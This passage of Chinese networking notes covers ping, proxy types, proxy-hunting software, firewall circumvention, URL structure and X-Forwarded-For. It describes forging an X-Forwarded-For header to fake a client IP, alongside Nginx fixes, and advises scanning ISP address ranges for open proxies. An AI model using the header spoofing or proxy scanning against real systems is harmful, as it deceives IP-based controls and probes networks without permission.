class="hljs-link">https://link.jianshu.com?t=http://www.baidu.com</span>)，系统默认的数据包是32字节，最大的字节数是65，527。</code></pre><pre><code class="hljs angelscript">Ping <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>   <span class="hljs-comment">//127.0.0.1是本地循环地址</span></code></pre><ul><li>如果本地址无法Ping通，则表明本地机TCP/IP协议不能正常工作。</li></ul><h3 id="对Ping后返回信息的分析"><a href="#对Ping后返回信息的分析" class="headerlink" title="对Ping后返回信息的分析"></a>对Ping后返回信息的分析</h3><blockquote><h6 id="Request-timed-out"><a href="#Request-timed-out" class="headerlink" title="Request timed out"></a>Request timed out</h6></blockquote><p>这是大家经常碰到的提示信息，很多文章中说这是对方机器置了过滤ICMP数据包，从上面工作过程来看，这是不完全正确的，至少有下几种情况。　　<br> 　(1)  对方已关机，或者网络上根本没有这个地址：比如在上图中主机A中PING 192.168.0.7 ,或者主机B关机了，在主机A中PING 192.168.0.5 都会得到超时的信息。<br> 　(2) 对方与自己不在同一网段内，通过路由也无法找到对方，但有时对方确实是存在的，当然不存在也是返回超时的信息。<br> 　(3) 对方确实存在，但设置了ICMP数据包过滤(比如防火墙设置)。<br> 　怎样知道对方是存在，还是不存在呢，可以用带参数 -a 的Ping命令探测对方，如果能得到对方的NETBIOS名称，则说明对方是存在的，是有防火墙设置，如果得不到，多半是对方不存在或关机，或不在同一网段内</p><blockquote><ul><li>其他的见链接</li></ul></blockquote><h2 id="代理服务器"><a href="#代理服务器" class="headerlink" title="代理服务器"></a>代理服务器</h2><p><strong>需求描述</strong>：</p><p>　　最近几天接触了<strong>代理服务器</strong>这个词，突然想，代理到底是什么呢？</p><p>　　什么代理服务器呢，使用这个代理服务器的目的到底是啥呢？</p><p><strong>概念分析</strong>：</p><h3 id="1-代理proxy："><a href="#1-代理proxy：" class="headerlink" title="1.代理proxy："></a><strong>1.代理proxy：</strong></h3><p>　　首先从概念上讲，代理这个词，词语的汉语解释：<strong>受委托代表当事人进行某种活动。</strong></p><p>　　也就是说，代理的作用就是代替别人做一些事情，比如，代理律师，就是代表当事人进行法律的活动。</p><h3 id="2-代理服务器proxy-server"><a href="#2-代理服务器proxy-server" class="headerlink" title="2.代理服务器proxy server"></a><strong>2.代理服务器proxy server</strong></h3><p>　　我们将上面的概念进行类比，代理服务器也就是一台服务器，一般我们的请求，会直接发送给真实的服务器，</p><p>　　真实的服务器来响应我们的请求。那么代理服务器的作用，就是把我们的请求先发送给代理服务器，由代理</p><p>　　服务器来将请求发送给真实的目标服务器上。同时呢，代理服务器可以判断，是否要真的把我们的一些请求发送</p><p>　　给真实的服务器，比如，在公司，不能上外网，那么公司会提供一个代理服务器，通过这个代理服务器我们就能上</p><p>　　外网了，但是会发现，有些视频网站，特殊的网站是访问不了的，也就是我们的这些请求不满足代理服务器的请求要求。</p><p>　　简单来说：代理服务器，就是代替我们把请求发送到目标服务器。</p><h3 id="3-使用代理服务器的目的"><a href="#3-使用代理服务器的目的" class="headerlink" title="3.使用代理服务器的目的"></a><strong>3.使用代理服务器的目的</strong></h3><p>　　–1）提高性能</p><p>　　代理服务器会有缓存，如果多次请求，或者多个请求是同样的内容，可以跳过从真实服务器取数据的过程，而是直接从代理服务器上获取</p><p>　　对于有成千上万的请求来说，那么会减少时间的消耗，进而提高性能</p><p>　　–2）过滤请求</p><p>　　比如，公司的代理服务器会过滤一些请求，来阻止员工访问一些特定的网站。</p><p><a href="https://sites.google.com/site/2018pk/222">https://sites.google.com/site/2018pk/222</a></p><h2 id="浅谈代理"><a href="#浅谈代理" class="headerlink" title="浅谈代理"></a><strong><em>浅谈代理</em></strong></h2><p>首先要说明，我们这里要谈的代理，是代理服务器，英文名叫Proxy Server。一般来讲，对于我们这些普通的网民它的作用有三个（撇开一些高深的用处不谈，因为我们未必会用到） </p><p>一是通过它，我们可以访问到一些平时不能去的网站。不信你可以马上打开你的浏览器和输入“<a href="http://www.youtube.com”这个网址。怎样？不用看着浏览器在这里空等了，并不是你的网络速度慢，也不是没有这个网站，而是你访问不到它（网络上还有很多这些类型的网站哦）。为什么访问不到？这个问题嘛......说法有很多种，大部分都说是国内的网络被限制了访问，所以某些网站是不能去的。至于如何可以访问到这些网站？看完本文你就知道了！">www.youtube.com”这个网址。怎样？不用看着浏览器在这里空等了，并不是你的网络速度慢，也不是没有这个网站，而是你访问不到它（网络上还有很多这些类型的网站哦）。为什么访问不到？这个问题嘛......说法有很多种，大部分都说是国内的网络被限制了访问，所以某些网站是不能去的。至于如何可以访问到这些网站？看完本文你就知道了！</a> </p><p>二是通过它来加快我们浏览某些网站的速度。有时候我们访问一些国外或者港台网站，速度慢得像蜗牛一样。但只要你正确的选用代理服务器，速度就可以得到提升，有时候这些速度的提升可是很明显的哦！ </p><p>三是连接Internet与Intranet 充当firewall（防火墙）：因为所有内部网的用户通过代理服务器访问外界时，只映射为一个IP地址，所以外界不能直接访问到内部网；同时可以设置IP地址过滤，限制内部网对外部的访问权限；另外，两个没有互联的内部网，也可以通过第三方的代理服务器进行互联来交换信息。<br>如果你在以往浏览过程中出现过以上的情况，那么看来你有必要尝试一下使用代理服务器了。<br>为什么使用代理服务器可以使我们访问一些原本不能访问的网站呢？为什么使用它后浏览外国网站会比原来的快呢？形象的说：代理服务器是网络信息的中转站。在一般情况下，我们使用网络浏览器直接去连接其他Internet站点取得网络信息时，须送出Request信号来得到回答，然后对方再把信息以bit方式传送回来。 </p><p>代理服务器是介于浏览器和Web服务器之间的一台服务器，有了它之后，浏览器不是直接到Web服务器去取回网页而是向代理服务器发出请求，Request信号会先送到代理服务器，由代理服务器来取回浏览器所需要的信息并传送给你的浏览器。而且，大部分代理服务器都具有缓冲的功能，就好象一个大的Cache，它有很大的存储空间，它不断将新取得数据储存到它本机的存储器上，如果浏览器所请求的数据在它本机的存储器上已经存在而且是最新的，那么它就不重新从Web服务器取数据，而直接将存储器上的数据传送给用户的浏览器，这样就能显著提高浏览速度和效率（速度会随着代理服务器地理位置的不同以及网络传输情况而改变），而且国外的网络大部分都是没有限制访问网站或者所限制的不同，所以我们有很大的机会通过代理服务器去访问那些原本不能够去的网站。 </p><p>更重要的是：Proxy Server (代理服务器)是 Internet链路级网关所提供的一种重要的安全功能，它的工作主要在开放系统互联 (OSI) 模型的对话层。<br>proxy对于我们这么有用，那么究竟怎样才可以在诺大的网络上找寻这些服务器呢？这就要靠一些专门找寻proxy的软件了，下面就是几款常用软件的介绍：<br>1.Proxy Hunter<br>这是Proxy搜索软件的老大哥了,自从1.0推出以来,就倍受全国网友热爱,目前版本是3.0,这个Proxy Hunter有什么特点呢?搜索速度之快,是同类软件之首,同时带有预测搜索任务完成时间的功能,除了教育网外,不限制搜索IP地址范围,同时支持HTTP与SOCKS类Proxy的搜索和验证,具备对已搜索得的Proxy地址进行管理,使用,自动调度,再验证等先进的功能。当有一大堆Proxy,不知用哪个好时,这时你需要自动调度功能,将网络软件的Proxy设置为本机IP(127.0.0.1),端口8080,然后在Proxy Hunter搜索结果列表中将欲使用的Proxy按鼠标右键设为“使用”(Enable),这样Proxy Hunter就会根据当时各Proxy速度的快慢,选择一个或数个使用,很方便吧。</p><p>2.Proxy NOW系列<br>这是由网站自动更新软件Update NOW的作者开发的,由HTTP Proxy NOW、SOCKS Proxy NOW、FTP Proxy NOW三部分组成，顾名思义,功能是分别搜索上述三类Proxy用的,若是能将其合一在一个软件里就好了,Proxy NOW系列的优点是绝对不限制搜索IP范围,但没注册进入时会有延时,不过只有几秒钟,没大碍,搜索速度还可以,算是中规中矩,缺点是功能分散单一,可设置项较少,验证不那么完善。 </p><p>3.SOCKS Cat<br>这是专门搜索SOCKS Proxy的,同样不限制搜索IP地址范围,速度也比较快,据作者称,其速度只比Proxy Hunter慢些,不过在验证SOCKS Proxy方面要做得好,同时支持SOCKS4、SOCKS5的Proxy的搜索和验证,支持设置供验证的网页,设置最高连接数等,经实际使用,效果不错,如果能加入对HTTP Proxy的搜索和验证功能可能会更好。 </p><p>总结:三者以Proxy Hunter为较好,但也不能一棵树吊死,应具体情况具体分析,选择一个适合的来用。 </p><p>当然,有些搜索经验也应该掌握,搜索Proxy,如大海捞针,不掌握要领,可是要吃大亏的。大规模搜索,效果好,但成本高,耗时长,不值得推荐。经过实践,局部地区震荡IP搜索法较好。例如,你所在地有一大ISP或者是ICP,假设其IP地址为202.96.123.123,这时请以总数1275(255 × 5)为震荡范围,计算出应尝试搜索的范围是202.96.121.0至202.96.125.255,祝你好运!还有连接时间设长一点,以及注意加入以下端口8080(HTTP) 3128(HTTP) 80(HTTP) 1080(SOCKS)这样才不会有漏网之鱼。 </p><p>接下来将以ProxyHunter为例子，为大家讲解如何搜索proxy。<br>当你填加完任务后，返回到主界面，按蓝色的开始键，这样ProxyHunter就会开始搜索代理了。现在你需要做的事情就是盯住搜索结果栏和耐心地等待。 </p><p>服务器地址：这里出现的就是你搜索到的代理服务器的IP。<br>端口：这个是它所用的端口。 </p><p>类型：就是这个Proxy的类型。<br>验证状态：这个最重要，它的状态分几种，上图列出的就是其中几种状态，通常如果成功搜索到这个proxy的话，它会显示为“FREE”，那么你就可以直接使用这个proxy；如果显示为“要密码”的话，基本上你可以把这个proxy删除了，除非你有能力把它的密码破解吧…；要是显示“连接超时”或“连接失败”等其他状态的话，那么可能你现在的网络正处于繁忙状态，也有可能是这个proxy暂时关闭了，你可以隔一段时间再去验证一次。 </p><p>时间特性：这个数值影响到这个proxy的速度，它显示的是你的机器连接到proxy的时间，如果你有多个proxy供你选择话，那么就选一个相对数值小的一个吧，连接的时间越小就代表这个porxy越快。 </p><p>经过上一步的搜索，想必你已经搜索到几个“Free”属性的Proxy了吧？恭喜恭喜～<br>那么究竟怎样才可以用这些Proxy呢？其实很简单，大部分软件都有一些软件属性的选项，比如“Setting”和“Preferences”等等。而在这些选项里面通常会有“Proxy”这个选项，你只需要在“Proxy”选项里面填上你搜索出来的Proxy的IP的端口，那么就可以使用这个Proxy了。如果软件是中文的话那么就更加简单，只要在“设置代理服务器”里面填上就ok了。 </p><p>以浏览器IE6为例：<br>１、打开“工具”里面的“Internet选项”。<br>２、点选“连接”框。<br>３、如果你使用拨号上网的话，那么选择“设置”。如果你是使用局域网的话，那么选择“局域网设置”。<br>４、在里面就有“代理服务器”这个设置。先点击“使用代理服务器”，然后在“地址”上填上Proxy的IP，在“端口”填上端口，好了！大功告成。 </p><p>1.HTTP代理服务器 代理服务器英文全称是Proxy Server，其功能就是代理网络用户去取得网络信息。形象的说：它是网络信息的中转站。在一般情况下，我们使用网络浏览器直接去连接其他Internet站点取得网络信息时，须送出Request信号来得到回答，然后对方再把信息以bit方式传送回来。<br>代理服务器是介于浏览器和Web服务器之间的一台服务器，有了它之后，浏览器不是直接到Web服务器去取回网页而是向代理服务器发出请求，Request信号会先送到代理服务器，由代理服务器来取回浏览器所需要的信息并传送给你的浏览器。而且，大部分代理服务器都具有缓冲的功能，就好象一个大的Cache，它有很大的存储空间，它不断将新取得数据储存到它本机的存储器上，如果浏览器所请求的数据在它本机的存储器上已经存在而且是最新的，那么它就不重新从Web服务器取数据，而直接将存储器上的数据传送给用户的浏览器，这样就能显著提高浏览速度和效率。<br>更重要的是：Proxy Server(代理服务器)是Internet链路级网关所提供的一种重要的安全功能，它的工作主要在开放系统互联(OSI)模型的对话层。<br>主要的功能有：<br>1.突破自身IP访问限制，访问国外站点。如：教育网、169网等网络用户可以通过代理访问国外网站。<br>2.访问一些单位或团体内部资源，如某大学FTP(前提是该代理地址在该资源的允许访问范围之内)，使用教育网内地址段免费<br>代理服务器，就可以用于对教育 网开放的各类FTP下载上传，以及各类资料查询共享等服务。<br>3.突破中国电信的IP限制：中国电信用户有很多网站是被限制访问的，这种限制是人为的，不同Serve对地址的限制是不同的。所以不能访问时可以换一个国 外的代理服务器试试。<br>4.提高访问速度：通常代理服务器都设置一个较大的硬盘缓冲区，当有外界的信息通过时，同时也将其保存到缓冲区中，当其他用户再访问相同的信息时， 则直接由缓冲区中取出信息，传给用户，以提高访问速度。<br>5.隐藏真实IP：上网者也可以通过这种方法隐藏自己的IP，免受攻击。<br>2.SSL 代理<br>SSL是一种国际标准的加密及身份认证通信协议，您用的浏览器就支持此协议。SSL（Secure Sockets Layer）最初是由美国Netscape公司研究出来的，后来成为了Internet网上安全通讯与交易的标准。SSL协议使用通讯双方的客户证书以及CA根证书，允许客户/服务器应用以一种不能被偷听的方式通讯，在通讯双方间建立起了一条安全的、可信任的通讯通道。它具备以下基本特征：信息保密性、信息完整性、相互鉴定。 主要用于提高应用程序之间数据的安全系数。SSL协议的整个概念可以被总结为：一个保证任何安装了安全套接字的客户和服务器间事务安全的协议，它涉及所有TC/IP应用程序。<br>SSL代理:支持最高128位加密强度的http代理，可以作为访问加密网站的代理。加密网站是指以https://开始的网站。ssl的标准端口为443。<br>默认状态下，IIS使用端口443作为SSL端口。但是你也可以根据需要使用任意端口。你可以有很多站点，每个站点有一个非SSL端口数字和一个SSL端口数字。例如，你可以有一个称为ExampleSite的站点，可以把90作为非SSL端口，445作为SSL端口。用户输入<a href="http://www.examplesite.com/">http://www.ExampleSite.com</a> ;来访问非SSL版本。要访问其SSL版本，就要输入<a href="https://www.ExampleSite.com。他们也可以使用IP：端口数,比如">https://www.ExampleSite.com。他们也可以使用IP：端口数,比如</a> <a href="https://www..com:445。">https://www..com:445。</a><br>https:// 中的“s”非常重要，因为它告诉用户浏览器使用SSL端口。如果你使用了<a href="http://www.Example.com:445，那么什么也不会发生，浏览器只是等待，但是什么也不显示出来。如果你给一个非SSL端口使用https">http://www.Example.com:445，那么什么也不会发生，浏览器只是等待，但是什么也不显示出来。如果你给一个非SSL端口使用https</a> ，例如<a href="https://www.ExampleSite.com:90，会出现同样的情形。">https://www.ExampleSite.com:90，会出现同样的情形。</a><br>3.Socks 代理<br>是全能代理，就像有很多跳线的转接板，它只是简单地将一端的系统连接到另外一端。支持多种协议，包括http、ftp请求及其它类型的请求。它分socks 4 和socks 5两种类型，socks 4只支持TCP协议而socks 5支持TCP/UDP协议，还支持各种身份验证机制等协议。其标准端口为1080。<br>socks代理相应的采用socks协议的代理服务器就是SOCKS服务器，是一种通用的代理服务器。Socks是个电路级的底层网关，是DavidKoblas在1990年开发的，此后就一直作为Internet RFC标准的开放标准。Socks不要求应用程序遵循特定的操作系统平台，Socks 代理与应用层代理、 HTTP 层代理不同，Socks代理只是简单地传递数据包，而不必关心是何种应用协议（比如FTP、HTTP和NNTP请求）。所以，Socks代理比其他应用层代理要快得多。它通常绑定在代理服务器的1080端口上。如果您在企业网或校园网上，需要透过防火墙或通过代理服务器访问Internet就可能需要使用SOCKS。一般情况下，对于拨号上网用户都不需要使用它。注意，浏览网页时常用的代理服务器通常是专门的http代理，它和SOCKS是不同的。因此，您能浏览网页不等于您一定可以通过SOCKS访问Internet。 常用的防火墙，或代理软件都支持SOCKS，但需要其管理员打开这一功能。如果您不确信您是否需要SOCKS或是否有SOCKS可用，请与您的网络管理员联系。<br>为了使用socks，您需要了解一下内容：<br>① SOCKS服务器的IP地址<br>② SOCKS服务所在的端口<br>③ 这个SOCKS服务是否需要用户认证？如果需要，您要向您的网络管理员申请一个用户和口令<br>知道了上述信息，您就可以把这些信息填入“网络配置”中，或者在第一次登记时填入，您就可以使用socks代理了。<br>在实际应用中SOCKS代理可以用作为：电子邮件、新闻组软件、网络传呼ICQ、网络聊天MIRC和使用代理服务器上联众打游戏等等各种游戏应用软件当中。<br>4.高级匿名代理<br>不改变你的request fields（报文），使服务器端看来就像有个真正的客户浏览器在访问它。当然，你的真实IP是隐藏起来的。服务器的网管不会认为你使用了代理。<br>5.普通匿名代理<br>能隐藏你的真实IP，但会更改你的request fields，有可能会被认为使用了代理，但仅仅是可能，一般说来是没问题的。不过不要受它的名字的误导，其安全性可能比全匿名代理更高，有的代理会剥离你的部分信息（就好比防火墙的stealth mode），使服务器端探测不到你的操作系统版本和浏览器版本。<br>6.elite代理<br>匿名隐藏性更高，可隐藏系统及浏览器资料信息等。此种代理安全性特强。<br>7.透明代理（简单代理）：<br>透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改编你的request fields（报文），并会传送真实IP。注意，加密的透明代理则是属于匿名代理，意思是不用设置使用代理了，例如Garden 2程序。<br>8.其它代理<br>FTP代理：代理客户机上的ftp软件访问ftp服务器，其端口一般为21、2121。<br>POP3代理：代理客户机上的邮件软件用pop3方式收邮件，其端口一般为110。<br>Telnet代理：能够代理通信机的telnet，用于远程控制，入侵时经常使用。其端口一般为23。<br>TUNNEL代理：经HTTPTunnet程序转换的数据包封装成http请求（Request）来穿透防火墙，允许利用HTTP服务器做任何TCP可以做的事情，功能相当于Socks5。<br>文献代理：可以用来查询数据库的代理，通过这些代理，可以获得互联网的相关科研学术的数据库资源，例如查询Sciencedirect网站（简称SD）、Academic Press、IEEE，SPRINGER等数据库。<br>教育网代理：指学术教育机构局域网通过特定的代理服务器可使无出国权限或无访问某IP段权限的计算机访问相关资源。<br>跳板代理：应用于跳板程序，可以看作一种具有动态加密的特殊socks5代理，，也可直接用于PSD软件。其端口一般为1813。<br>Ssso代理：代理客户机上的ssso程序访问远程网站，具有SSL加密强度的超级代理，支持socks。<br>Flat代理：代理客户机上的flatsurfer程序访问远程网站，具有高强度加密数据流的特殊代理，支持socks，最大可设置三次级联，可以设置穿越代理。其端口一般为6700。<br>SoftE代理：代理客户机上的SoftEther程序访问远程网站，应用虚拟集线器HUB和虚拟网卡技术，具备VPN功能及多种认证方式的代理。</p><p>网友们在中国上网最头疼的是什么？网速慢？网络不稳定？NO<del>NO</del>NO<del>NO</del>,在中国上网最头疼的是，永远有一面墙阻碍着你，让你上不了诸如：twitter、Facebook、youtube这些优秀的网站，正因为有了这一面“墙”，我们中国网民才个个都成了翻墙高手。<br>这是不完全翻墙的结果，就是网站能上，视频看不了！</p><p>要想翻墙，就要先了解一下，这面“墙”的工作原理<br>原理：防火长城对所有经过骨干出口路由的在UDP的53端口上的域名查询进行IDS入侵检测，一经发现与黑名单关键词相匹配的域名查询请求，防火长城会马上伪装成目标域名的解析服务器给查询者返回虚假结果。由于通常的域名查询没有任何认证机制，而且域名查询通常基于的UDP协议是无连接不可靠的协议，查询者只能接受最先到达的格式正确结果，并丢弃之后的结果。而用户直接查询境外域名查询服务器（比如 Google Public DNS ）又可能会被防火长城污染，从而在没有任何防范机制的情况下仍然不能获得目标网站正确的IP地址。VIA 维基百科<br>从上面我们了解了GFW（防火长城，又称中国防火墙）的工作原理，下面我们就可以实施翻墙工作。</p><p>翻墙的方式有很多，下面一一介绍<br>1、最简单的翻墙方式——网页代理</p><p>提供网页代理的网站有很多，如</p><p>（1）<a href="http://proxyie.cn/">http://proxyie.cn/</a><br>（2）<a href="http://www.nbdaili.com/">http://www.nbdaili.com/</a><br>（3）<a href="https://member.proxy80.cn/">https://member.proxy80.cn/</a><br>（4）<a href="http://proxy.fengyn.com/">http://proxy.fengyn.com/</a></p><p>网页代理的优点就是方便，随手可得，可是也有很多的缺点，如：不稳定、对部分网页支持不好、有时只能加载主页面（也就是前面所说的不完全翻墙）、而且，网页翻墙遇到关键词屏蔽就没辙了，因为网页代理是透明代理。</p><p>2、HTTP代理<br>HTTP代理就是通过修改浏览器中代理一项来达到翻墙的目的。<br>但是,HTTP代理目前已经很少人去用，因为操作麻烦，代理服务器要自己去找（现在要找到稳定的、速度快的代理服务器也比较难了），而且，HTTP代理也分好几级，有透明代理和加密代理，但现在一般都只能找到透明代理。</p><p>3、HTTP代理以后衍生出的一种代理方式——自动代理<br>自动代理的原理和HTTP代理的原理差不多，只不过自动代理将搜索代理、设置代理都变的自动化，目前自动代理的软件也很多，有自由门、Hotspot Shield Launch等，我用的就是Hotspot Shield Launch，是免费的，只是它会在网页顶放置广告。<br>虽说Hotspot Shield Launch是自动代理的一种，但也属于VPN。</p><p>4、VPN<br>VPN的原理就是在你和服务器中间建立一条加密通道，因为此通道是加密的，所以GFW也奈何不了你，是最好的代理方式。要说缺点，就是目前免费的VPN比较少，都要付费，可也并不贵，上面的Hotspot Shield Launch就是其中一款免费VPN。（VPN也有两种方式，一种是上面的软件，一中是VPN服务商给一个VPN账号和密码，想宽带拨号那样，建立一个连接。）</p><p>前面所说的代理方式一般都要经过外国的服务器，所以网速自然不能保证，那既然GFW只是不让返回一个真实IP地址，那我们就让电脑先知道该网站的IP地址。</p><p>最后介绍的方法就是修改hosts文件<br>hosts文件其实就是一个文本文件，用记事本就可以打开，电脑访问网站，其实是通过以下流程完成的：电脑——检测host说是否有该网站IP（如没有）——ISP——DNS服务器——IP地址——网站服务器，只要电脑检测到host说已经存在该域名的IP地址，就会绕过DNS解析，直接连接对方服务器，因为GFW就是在域名解析这里做手脚，只要绕过就行了。hosts文件路径是：C:\WINDOWS\system32\drivers\etc，目前可以上google搜到这些IP地址。</p><p>改hosts方式翻墙只要按照下面的格式添加就行：IP地址 域名<br>这种方式的优点就是绕过大部分步骤，不用经过国外的转发服务器，访问速度快。<br>但缺点也很明显，由于GFW也检测IP地址，如果多人用这种方式翻墙，GFW很快就会发现并屏蔽，所以生命周期短。而且，因为对方服务器的IP是有限的，当所有IP都被GFW屏蔽以后，这个方法就失效了。<br>所以目前最好的方式还是用VPN，也并不是太贵。</p><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p><a href="https://www.zhihu.com/question/20377296">https://www.zhihu.com/question/20377296</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">HTTP所有的百科</a></p><h2 id="MIME-TYPE"><a href="#MIME-TYPE" class="headerlink" title="MIME  TYPE"></a>MIME  TYPE</h2><p><a href="https://www.jianshu.com/p/24c5433ce31b">https://www.jianshu.com/p/24c5433ce31b</a></p><h2 id="HTTP、URL"><a href="#HTTP、URL" class="headerlink" title="HTTP、URL"></a>HTTP、URL</h2><p><a href="https://www.jianshu.com/p/80e25cb1d81a">https://www.jianshu.com/p/80e25cb1d81a</a></p><p>Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息.</p><p>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息</p><h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h3><p>全称是UniformResourceLocator, 中文叫统一资源定位符,是互联网上用来标识某一处资源的地址。以下面这个URL为例，介绍下普通URL的各部分组成：</p><p><a href="https://link.jianshu.com/?t=http://www.aspxfans.com:8080/news/index.asp?boardID=5&ID=24618&page=1#name">http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name</a></p><p>从上面的URL可以看出，一个完整的URL包括以下几部分：<br> 1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符</p><p>2.域名部分：该URL的域名部分为“<a href="https://link.jianshu.com/?t=http://www.aspxfans.com">www.aspxfans.com</a>”。一个URL中，也可以使用IP地址作为域名使用</p><p>3.端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口</p><p>4.虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”</p><p>5.文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名</p><p>6.锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分</p><p>7.参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称<strong>搜索部分、查询部分</strong>。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="X-Forwarded-For-XFF"><a href="#X-Forwarded-For-XFF" class="headerlink" title="X-Forwarded-For (XFF)"></a><strong>X-Forwarded-For</strong> <strong>(XFF)</strong></h3><ul><li><strong>用来获取最初发起请求的客户端的IP地址</strong></li></ul><pre><code class="hljs xml">X-Forwarded-For: <span class="hljs-tag">&lt;<span class="hljs-name">client</span>&gt;</span>, <span class="hljs-tag">&lt;<span class="hljs-name">proxy1</span>&gt;</span>, <span class="hljs-tag">&lt;<span class="hljs-name">proxy2</span>&gt;</span></code></pre><ul><li><client><p>客户端的IP地址。</p></client></li><li><p><proxy1>, <proxy2></proxy2></proxy1></p><p>如果一个请求经过了多个代理服务器，那么每一个代理服务器的IP地址都会被依次记录在内。也就是说，最右端的IP地址表示最近通过的代理服务器，而最左端的IP地址表示最初发起请求的客户端的IP地址。</p></li></ul><p>eg：</p><pre><code class="hljs html">X-Forwarded-For: 2001:db8:85a3:8d3:1319:8a2e:370:7348X-Forwarded-For: 203.0.113.195X-Forwarded-For: 203.0.113.195, 70.41.3.18, 150.172.238.178</code></pre><p>因为 IP 是一个一个依次 push 进去的，那么第一个 IP 就是用户的真实 IP，取来用就好了。</p><p><strong>但是，事实有这么简单吗？</strong></p><blockquote><p>拓展：<a href="https://www.cnblogs.com/skychx/p/X-Forwarded-For-get-real-IP.html"><strong>你确信 X-Forwarded-For 拿到的就是用户真实 IP 吗？</strong></a></p></blockquote><h4 id="CTF相关"><a href="#CTF相关" class="headerlink" title="CTF相关"></a>CTF相关</h4><h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><p>从安全的角度上考虑，整个系统最不安全的就是人，用户端都是最好攻破最好伪造的。有些用户就开始钻协议的漏洞：<code>X-Forwarded-For</code> 是代理服务器添加的，如果我一开始请求的 Header 头里就加了 <code>X-Forwarded-For</code> ，不就骗过服务器了吗？</p><p><strong>1.</strong> 首先从客户端发出请求，带有 <code>X-Forwarded-For</code> 请求头，里面写一个伪造的 IP：</p><pre><code class="hljs groovy">X-Forwarded-<span class="hljs-attr">For:</span> fakeIP</code></pre><p><strong>2.</strong> 服务端第一层代理服务收到请求，发现已经有 <code>X-Forwarded-For</code>，误把这个请求当成代理服务器，于是向这个字段追加了客户端的真实 IP：</p><pre><code class="hljs axapta">X-Forwarded-For: fakeIP, <span class="hljs-keyword">client</span></code></pre><p><strong>3.</strong> 经过几层代理后，最终的服务器拿到的 Header 是这样的：</p><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For: fakeIP, client, proxy<span class="hljs-number">1</span>, proxy<span class="hljs-number">2</span></code></pre><p>要是按照取 <code>X-Forwarded-For</code> 第一个 IP 的思路，你就着了攻击者的道了，你拿到的是 fakeIP，而不是 client IP。</p><h5 id="破招"><a href="#破招" class="headerlink" title="破招"></a>破招</h5><ol><li>服务端如何破招？上面三个步骤：</li></ol><ul><li><p>第一步是客户端造假，服务器无法介入</p></li><li><p>第二步是代理服务器，可控，可防范</p></li><li><p>第三步是应用服务器，可控，可防范</p><p>2.第二步的破解我拿 Nginx 服务器举例。</p></li></ul><p>我们在最外层的 Nginx 上，对 <code>X-Forwarded-For</code> 的配置如下：</p><pre><code class="hljs nginx"><span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$remote_addr</span>;</code></pre><p>什么意思呢？就是<strong>最外层代理服务器不信任客户端的 <code>X-Forwarded-For</code> 输入，直接覆盖，而不是追加</strong>。</p><p>非最外层的 Nginx 服务器，我们配置：</p><pre><code class="hljs nginx"><span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;</code></pre><p><code>$proxy_add_x_forwarded_for</code> 就是追加 IP 的意思。通过这招，就可以破解用户端的伪造办法。</p><p>第三步的破解思路也很容易，正常思路我们是取<code>X-Forwarded-For</code> 最左侧的 IP，这次我们反其道而行之，<strong>从右边数，减去代理服务器的数目</strong>，那么剩下的 IP 里，最右边的就是真实 IP。</p><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For: fakeIP, client, proxy<span class="hljs-number">1</span>, proxy<span class="hljs-number">2</span></code></pre><p>比如说我们已知代理服务有两层，从右向左数，把 <code>proxy1</code> 和 <code>proxy2</code> 去掉，剩下的 IP 列表最右边的就是真实 IP。。</p><h3 id="5-一句话总结总结"><a href="#5-一句话总结总结" class="headerlink" title="5.一句话总结总结"></a><strong>5.一句话总结总结</strong></h3><p>通过 <code>X-Forwarded-For</code> 获取用户真实 IP 时，最好不要取第一个 IP，以防止用户伪造 IP。</p><h2 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h2><p><a href="https://zhuanlan.zhihu.com/p/139303753">https://zhuanlan.zhihu.com/p/139303753</a></p><p>我们在上网的时候，通常输入的是网址，其实这就是一个域名，而我们计算机网络上的计算机彼此之间只能用IP地址才能相互识别。将域名映射为IP地址的过程就称为“域名解析”。在Internet上域名与IP地址之间是一对一（或者多对一）的，也可采用DNS轮循实现一对多，域名虽然便于人们记忆，但机器之间只认IP地址，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析服务器来完成，<strong>DNS就是进行域名解析的服务器。</strong></p><p><img src="https://s3.ax1x.com/2020/11/26/DBYQsS.jpg" 